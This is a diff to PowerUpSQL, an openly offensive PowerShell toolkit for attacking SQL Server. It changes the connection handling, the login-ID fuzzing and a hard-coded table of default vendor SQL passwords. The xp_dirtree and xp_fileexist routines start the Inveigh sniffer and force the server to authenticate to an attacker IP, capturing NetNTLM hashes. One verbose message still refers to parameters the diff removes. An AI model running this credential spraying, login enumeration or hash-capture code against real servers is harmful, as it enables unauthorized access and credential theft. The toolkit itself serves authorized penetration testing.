@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.50
+        Version: 1.0.0.55
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -21,6 +21,8 @@
 # ----------------------------------
 # Author: Scott Sutherland
 # Reference: https://msdn.microsoft.com/en-us/library/ms188247.aspx
+# Reference: https://raw.githubusercontent.com/sqlcollaborative/dbatools/master/functions/SharedFunctions.ps1
+# Reference: https://blogs.msdn.microsoft.com/spike/2008/11/14/connectionstrings-mixing-usernames-and-windows-authentication-who-goes-first/
 Function  Get-SQLConnectionObject
 {
     <#
@@ -116,36 +118,32 @@ Function  Get-SQLConnectionObject
         # Create connection object
         $Connection = New-Object -TypeName System.Data.SqlClient.SqlConnection
 
-        # Check for username and password
-        if($Username -and $Password)
-        {
-            # Setup connection string with SQL Server credentials
-            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut"
-        }
-        else
-        {
-            # Get connecting user
-            $UserDomain = [Environment]::UserDomainName
-            $Username = [Environment]::UserName
-            $ConnectionectUser = "$UserDomain\$Username"
+        # Set authentcation type - current windows user
+        if(-not $Username){
 
-            # Status user
-            Write-Debug -Message "Attempting to authenticate to $DacConn$Instance as current Windows user ($ConnectionectUser)..."
+            # Set authentication type
+            $AuthenticationType = "Current Windows Credentials"
 
-            # Setup connection string with trusted connection
+            # Set connection string
             $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=1"
+        }
+        
+        # Set authentcation type - provided windows user
+        if ($username -like "*\*"){
+            $AuthenticationType = "Provided Windows Credentials"
 
-            <#
-                    # Check for provided credential
-                    if ($Credential){
+            # Setup connection string 
+            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;uid=$Username;pwd=$Password;Connection Timeout=$TimeOut"
+        }
 
-                    $Username = $credential.Username
-                    $Password = $Credential.GetNetworkCredential().Password
+        # Set authentcation type - provided sql login
+        if (($username) -and ($username -notlike "*\*")){
 
-                    # Setup connection string with SQL Server credentials
-                    $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut"
-                    }
-            #>
+            # Set authentication type
+            $AuthenticationType = "Provided SQL Login"
+
+            # Setup connection string 
+            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut"
         }
 
         # Return the connection object
@@ -8136,12 +8134,8 @@ Function  Get-SQLFuzzServerLogin
         [string]$Instance,
 
         [Parameter(Mandatory = $false,
-        HelpMessage = 'Principal ID to start fuzzing with.')]
-        [string]$StartId = 1,
-
-        [Parameter(Mandatory = $false,
-        HelpMessage = 'Principal ID to stop fuzzing on.')]
-        [string]$EndId = 300,
+        HelpMessage = 'Number of Principal IDs to fuzz.')]
+        [string]$FuzzNum = 10000,
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Try to determine if the principal type is role, SQL login, or Windows account via error analysis of sp_defaultdb.')]
@@ -8198,21 +8192,30 @@ Function  Get-SQLFuzzServerLogin
             return
         }
 
-        # Fuzz from StartId to EndId
-        $StartId..$EndId |
-        ForEach-Object -Process {
-            # Define Query
-            $Query = "SELECT    '$ComputerName' as [ComputerName],
+        # Define Query
+        # Reference: https://gist.github.com/ConstantineK/c6de5d398ec43bab1a29ef07e8c21ec7
+        $Query = "
+                SELECT 
+                '$ComputerName' as [ComputerName],
                 '$Instance' as [Instance],
-                '$_' as [PrincipalId],
-            SUSER_NAME($_) as [PrincipleName]"
+                n [PrincipalId], SUSER_NAME(n) as [PrincipleName]
+                from ( 
+                select top $FuzzNum row_number() over(order by t1.number) as N
+                from   master..spt_values t1 
+                       cross join master..spt_values t2
+                ) a
+                where SUSER_NAME(n) is not null"
 
-            # Execute Query
-            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+        # Execute Query
+        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
+        # Process results
+        $TblResults |
+        ForEach-Object {
 
             # check if principal is role, sql login, or windows account
-            $PrincipalName = $TblResults.PrincipleName
-            $PrincipalId = $TblResults.PrincipalId
+            $PrincipalName = $_.PrincipleName
+            $PrincipalId = $_.PrincipalId
 
             if($GetPrincipalType)
             {
@@ -8222,7 +8225,7 @@ Function  Get-SQLFuzzServerLogin
                 # Check the error message for a signature that means the login is real
                 if (($RoleCheckResults -like '*NOTAREALDATABASE*') -or ($RoleCheckResults -like '*alter the login*'))
                 {
-                    #
+
                     if($PrincipalName -like '*\*')
                     {
                         $PrincipalType = 'Windows Account'
@@ -8238,21 +8241,7 @@ Function  Get-SQLFuzzServerLogin
                 }
             }
 
-            # Output for user
-            if(-not $SuppressVerbose)
-            {
-                if($PrincipalName.length -ge 2)
-                {
-                    Write-Verbose -Message "$Instance : - Principal ID $_ resolved to: $PrincipalName ($PrincipalType)"
-                }
-                else
-                {
-                    Write-Verbose -Message "$Instance : - Principal ID $_ resolved to: "
-                }
-            }
-
-            # Append results
-            #$TblFuzzedLogins = $TblFuzzedLogins + $TblResults
+            # Add to result set
             if($GetPrincipalType)
             {
                 $null = $TblFuzzedLogins.Rows.Add($ComputerName, $Instance, $PrincipalId, $PrincipalName, $PrincipalType)
@@ -8261,6 +8250,7 @@ Function  Get-SQLFuzzServerLogin
             {
                 $null = $TblFuzzedLogins.Rows.Add($ComputerName, $Instance, $PrincipalId, $PrincipalName)
             }
+
         }
     }
 
@@ -8269,6 +8259,11 @@ Function  Get-SQLFuzzServerLogin
         # Return data
         $TblFuzzedLogins | Where-Object -FilterScript {
             $_.PrincipleName.length -ge 2
+        }
+        
+        if( -not $SuppressVerbose)
+        {
+            Write-Verbose -Message "$Instance : Complete."
         }
     }
 }
@@ -8888,45 +8883,48 @@ Function  Get-SQLServerLoginDefaultPw
 
         # Populate DefaultPasswords data table
         $DefaultPasswords.Rows.Add("ACS","ej","ej") | Out-Null
-        $DefaultPasswords.Rows.Add("vocollect","vocollect","vocollect") | Out-Null
-        $DefaultPasswords.Rows.Add("SQL2K5","ovsd","ovsd") | Out-Null
-        $DefaultPasswords.Rows.Add("INTRAVET","sa","Webster#1") | Out-Null
-        $DefaultPasswords.Rows.Add("CDRDICOM","sa","CDRDicom50!") | Out-Null
-        $DefaultPasswords.Rows.Add("SIDEXIS_SQL","sa","2BeChanged") | Out-Null
-        $DefaultPasswords.Rows.Add("ECC","sa","Webgility2011") | Out-Null
-        $DefaultPasswords.Rows.Add("BOSCHSQL","sa","RPSsql12345") | Out-Null
-        $DefaultPasswords.Rows.Add("HDPS","sa","sa") | Out-Null
-        $DefaultPasswords.Rows.Add("DVTEL","sa","") | Out-Null
-        $DefaultPasswords.Rows.Add("SALESLOGIX","sa","SLXMaster") | Out-Null
         $DefaultPasswords.Rows.Add("ACT7","sa","sage") | Out-Null
-        $DefaultPasswords.Rows.Add("CSSQL05","ELNAdmin","ELNAdmin") | Out-Null
-        $DefaultPasswords.Rows.Add("CSSQL05","sa","CambridgeSoft_SA") | Out-Null
-        $DefaultPasswords.Rows.Add("INSERTGT","msi","keyboa5") | Out-Null
-        $DefaultPasswords.Rows.Add("INSERTGT","sa","") | Out-Null
-        $DefaultPasswords.Rows.Add("RTCLOCAL","sa","mypassword") | Out-Null
-        $DefaultPasswords.Rows.Add("PCAMERICA","sa","PCAmerica") | Out-Null
-        $DefaultPasswords.Rows.Add("PCAMERICA","sa","pcAmer1ca") | Out-Null
-        $DefaultPasswords.Rows.Add("VSDOTNET","sa","") | Out-Null
-        $DefaultPasswords.Rows.Add("HPDSS","sa","Hpdsdb000001") | Out-Null
-        $DefaultPasswords.Rows.Add("HPDSS","sa","hpdss") | Out-Null
-        $DefaultPasswords.Rows.Add("MYMOVIES","sa","t9AranuHA7") | Out-Null
+        $DefaultPasswords.Rows.Add("AOM2","admin","ca_admin") | out-null
+        $DefaultPasswords.Rows.Add("ARIS","ARIS9","*ARIS!1dm9n#") | out-null
+        $DefaultPasswords.Rows.Add("AutodeskVault","sa","AutodeskVault@26200") | Out-Null      
+        $DefaultPasswords.Rows.Add("BOSCHSQL","sa","RPSsql12345") | Out-Null
+        $DefaultPasswords.Rows.Add("BPASERVER9","sa","AutoMateBPA9") | Out-Null
+        $DefaultPasswords.Rows.Add("CDRDICOM","sa","CDRDicom50!") | Out-Null
         $DefaultPasswords.Rows.Add("CODEPAL","sa","Cod3p@l") | Out-Null
         $DefaultPasswords.Rows.Add("CODEPAL08","sa","Cod3p@l") | Out-Null
-        $DefaultPasswords.Rows.Add("VSQL","sa","111") | Out-Null
-        $DefaultPasswords.Rows.Add("EASYSHIP","sa","DHLadmin@1") | Out-Null
-        $DefaultPasswords.Rows.Add("DHLEASYSHIP","sa","DHLadmin@1") | Out-Null
-        $DefaultPasswords.Rows.Add("ECOPYDB","sa","ecopy") | Out-Null
-        $DefaultPasswords.Rows.Add("ECOPYDB","e+C0py2007_@x","e+C0py2007_@x") | Out-Null
-        $DefaultPasswords.Rows.Add("TEW_SQLEXPRESS","tew","tew") | Out-Null
-        $DefaultPasswords.Rows.Add("AutodeskVault","sa","AutodeskVault@26200") | Out-Null      
-        $DefaultPasswords.Rows.Add("Emerson2012","sa","42Emerson42Eme") | Out-Null
-        $DefaultPasswords.Rows.Add("RMSQLDATA","Super","Orange") | out-null
         $DefaultPasswords.Rows.Add("CounterPoint","sa","CounterPoint8") | Out-Null
-        $DefaultPasswords.Rows.Add("SQLEXPRESS","admin","ca_admin") | out-null
-        $DefaultPasswords.Rows.Add("AOM2","admin","ca_admin") | out-null
+        $DefaultPasswords.Rows.Add("CSSQL05","ELNAdmin","ELNAdmin") | Out-Null
+        $DefaultPasswords.Rows.Add("CSSQL05","sa","CambridgeSoft_SA") | Out-Null
+        $DefaultPasswords.Rows.Add("CADSQL","CADSQLAdminUser","Cr41g1sth3M4n!") | Out-Null
+        $DefaultPasswords.Rows.Add("DHLEASYSHIP","sa","DHLadmin@1") | Out-Null
         $DefaultPasswords.Rows.Add("DPM","admin","ca_admin") | out-null
-        $DefaultPasswords.Rows.Add("ARIS","ARIS9","*ARIS!1dm9n#") | out-null
-        $DefaultPasswords.Rows.Add("STANDARDDEV2014","test","test") | Out-Null
+        $DefaultPasswords.Rows.Add("DVTEL","sa","") | Out-Null
+        $DefaultPasswords.Rows.Add("EASYSHIP","sa","DHLadmin@1") | Out-Null
+        $DefaultPasswords.Rows.Add("ECC","sa","Webgility2011") | Out-Null
+        $DefaultPasswords.Rows.Add("ECOPYDB","e+C0py2007_@x","e+C0py2007_@x") | Out-Null
+        $DefaultPasswords.Rows.Add("ECOPYDB","sa","ecopy") | Out-Null
+        $DefaultPasswords.Rows.Add("Emerson2012","sa","42Emerson42Eme") | Out-Null
+        $DefaultPasswords.Rows.Add("HDPS","sa","sa") | Out-Null
+        $DefaultPasswords.Rows.Add("HPDSS","sa","Hpdsdb000001") | Out-Null
+        $DefaultPasswords.Rows.Add("HPDSS","sa","hpdss") | Out-Null
+        $DefaultPasswords.Rows.Add("INSERTGT","msi","keyboa5") | Out-Null
+        $DefaultPasswords.Rows.Add("INSERTGT","sa","") | Out-Null
+        $DefaultPasswords.Rows.Add("INTRAVET","sa","Webster#1") | Out-Null
+        $DefaultPasswords.Rows.Add("MYMOVIES","sa","t9AranuHA7") | Out-Null
+        $DefaultPasswords.Rows.Add("PCAMERICA","sa","pcAmer1ca") | Out-Null
+        $DefaultPasswords.Rows.Add("PCAMERICA","sa","PCAmerica") | Out-Null
+        $DefaultPasswords.Rows.Add("PRISM","sa","SecurityMaster08") | Out-Null
+        $DefaultPasswords.Rows.Add("RMSQLDATA","Super","Orange") | out-null
+        $DefaultPasswords.Rows.Add("RTCLOCAL","sa","mypassword") | Out-Null
+        $DefaultPasswords.Rows.Add("SALESLOGIX","sa","SLXMaster") | Out-Null
+        $DefaultPasswords.Rows.Add("SIDEXIS_SQL","sa","2BeChanged") | Out-Null
+        $DefaultPasswords.Rows.Add("SQL2K5","ovsd","ovsd") | Out-Null
+        $DefaultPasswords.Rows.Add("SQLEXPRESS","admin","ca_admin") | out-null
+        $DefaultPasswords.Rows.Add("STANDARDDEV2014","test","test") | Out-Null 
+        $DefaultPasswords.Rows.Add("TEW_SQLEXPRESS","tew","tew") | Out-Null
+        $DefaultPasswords.Rows.Add("vocollect","vocollect","vocollect") | Out-Null
+        $DefaultPasswords.Rows.Add("VSDOTNET","sa","") | Out-Null
+        $DefaultPasswords.Rows.Add("VSQL","sa","111") | Out-Null
 
         $PwCount = $DefaultPasswords | measure | select count -ExpandProperty count
         # Write-Verbose "Loaded $PwCount default passwords."
@@ -9137,7 +9135,7 @@ function Get-DomainSpn
             $SpnResults | ForEach-Object -Process {
                 [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(' ')
                 [string]$SidString = $SidBytes -replace ' ', ''
-                $Spn = $_.properties.serviceprincipalname.split(',')
+                $Spn = $_.properties.serviceprincipalname[0].split(',')
 
                 foreach ($item in $Spn)
                 {
@@ -12438,34 +12436,39 @@ Function Invoke-SQLAuditPrivXpDirtree
                                 Write-Verbose -Message "$Instance : - Start sniffing..."
                                 $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp
 
+                                # Randomized 5 character file name
+                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
 
                                 # Sent unc path to attacker's Ip
-                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\path..."
-                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\path'" -TimeOut 10 -SuppressVerbose
+                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
+                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose
 
+								# Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
+								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
+                                Start-Sleep -s $TimeOut
+                                
                                 # Stop sniffing and print password hashes
-                                Start-Sleep $TimeOut
                                 $null = Stop-Inveigh
                                 Write-Verbose -Message "$Instance : - Stopped sniffing."
 
                                 $HashType = ''
                                 $Hash = ''
 
-                                [string]$PassCleartext = Get-InveighCleartext
+                                [string]$PassCleartext = Get-Inveigh -Cleartext Y
                                 if($PassCleartext)
                                 {
                                     $HashType = 'Cleartext'
                                     $Hash = $PassCleartext
                                 }
 
-                                [string]$PassNetNTLMv1 = Get-InveighNTLMv1
+                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1 Y
                                 if($PassNetNTLMv1)
                                 {
                                     $HashType = 'NetNTLMv1'
                                     $Hash = $PassNetNTLMv1
                                 }
 
-                                [string]$PassNetNTLMv2 = Get-InveighNTLMv2
+                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2 Y
                                 if($PassNetNTLMv2)
                                 {
                                     $HashType = 'NetNTLMv2'
@@ -12773,33 +12776,39 @@ Function Invoke-SQLAuditPrivXpFileexist
                                 Write-Verbose -Message "$Instance : - Start sniffing..."
                                 $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp
 
+                                # Randomized 5 character file name
+                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
+
                                 # Sent unc path to attacker's Ip
-                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\path..."
-                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\file'" -TimeOut 10 -SuppressVerbose
+                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
+                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose
+
+								# Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
+								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
+                                Start-Sleep -s $TimeOut
 
                                 # Stop sniffing and print password hashes
-                                Start-Sleep $TimeOut
                                 $null = Stop-Inveigh
                                 Write-Verbose -Message "$Instance : - Stopped sniffing."
 
                                 $HashType = ''
                                 $Hash = ''
 
-                                [string]$PassCleartext = Get-InveighCleartext
+                                [string]$PassCleartext = Get-Inveigh -Cleartext Y
                                 if($PassCleartext)
                                 {
                                     $HashType = 'Cleartext'
                                     $Hash = $PassCleartext
                                 }
 
-                                [string]$PassNetNTLMv1 = Get-InveighNTLMv1
+                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1 Y
                                 if($PassNetNTLMv1)
                                 {
                                     $HashType = 'NetNTLMv1'
                                     $Hash = $PassNetNTLMv1
                                 }
 
-                                [string]$PassNetNTLMv2 = Get-InveighNTLMv2
+                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2 Y
                                 if($PassNetNTLMv2)
                                 {
                                     $HashType = 'NetNTLMv2'
@@ -13447,12 +13456,8 @@ Function Invoke-SQLAuditWeakLoginPw
         [switch]$NoUserEnum,
 
         [Parameter(Mandatory = $false,
-        HelpMessage = 'Start id for fuzzing login IDs.')]
-        [int]$StartId = 1,
-
-        [Parameter(Mandatory = $false,
-        HelpMessage = 'End id for fuzzing login IDss.')]
-        [int]$EndId = 500,
+        HelpMessage = 'Number of Principal IDs to fuzz.')]
+        [string]$FuzzNum = 10000,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
@@ -13586,7 +13591,7 @@ Function Invoke-SQLAuditWeakLoginPw
                 {
                     # Fuzz logins
                     Write-Verbose -Message "$Instance - Fuzzing principal IDs $StartId to $EndId..."
-                    Get-SQLFuzzServerLogin -Instance $Instance -GetPrincipalType -Username $Username -Password $Password -Credential $Credential -StartId $StartId -EndId $EndId -SuppressVerbose |
+                    Get-SQLFuzzServerLogin -Instance $Instance -GetPrincipalType -Username $Username -Password $Password -Credential $Credential -FuzzNum $FuzzNum -SuppressVerbose |
                     Where-Object -FilterScript {
                         $_.PrincipleType -eq 'SQL Login'
                     } |
